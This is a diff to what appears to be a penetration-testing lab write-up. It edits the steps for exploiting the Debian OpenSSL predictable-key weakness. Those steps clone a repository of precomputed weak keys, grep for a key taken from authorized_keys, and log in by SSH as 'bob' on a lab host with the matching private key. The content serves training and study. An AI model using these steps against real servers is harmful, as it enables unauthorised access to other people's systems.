@@ -29,18 +29,18 @@ ssh-dss AAAAB3NzaC1kc3MAAACBAOgzzMCD3Im5bRnAVdV3yLwTsyNAi3IiFShIfx9bUcUNmyFDM7Sa
 Get the debian SSH repo:
 
 ```
-git clone https://github.com/shn3rd/Debian-OpenSSL-Predictable-PRNG
-tar vjxf debian-ssh/common_keys/debian_ssh_dsa_1024_x86.tar.bz2
+sudo git clone https://github.com/shn3rd/OpenSSL-PRNG.git
+sudo tar vjxf debian_ssh_dsa_1024_x86.tar.bz2
 ```
 
 Copy the first 30 (approx.) characters after ssh-dss in the authorized_keys, then search it in the repo using grep -lr:
+
 ```shell
-(kali㉿kali)-[~/…/g0tmi1k-debian-ssh/common_keys/dsa/1024]
-└─$ grep -lr "AAAAB3NzaC1kc3MAAACBAOgzzMCD3Im5bRnAVdV3yLwTsyNAi3IiFShIfx9bUcUNmyFDM7SaFrVBuuI"    
+kali@kali:~/OpenSSL-PRNG/CommonKeys/dsa/1024$ sudo grep -lr "AAAAB3NzaC1kc3MAAACBAOgzzMCD3Im5bRnAVdV3yLwTsyNAi3IiFShIfx9bUcUNmyFDM7SaFrVBuuI"
 f1fb2162a02f0f7c40c210e6167f05ca-16858.pub
 ```
 
-Finally, use the co-located private key file of found .pub file to ssh:
+Finally, use the co-located private key file `f1fb2162a02f0f7c40c210e6167f05ca-16858` of found .pub file to ssh:
 
 ```shell
 kali@kali:$ sudo ssh -i f1fb2162a02f0f7c40c210e6167f05ca-16858  bob@10.11.1.136
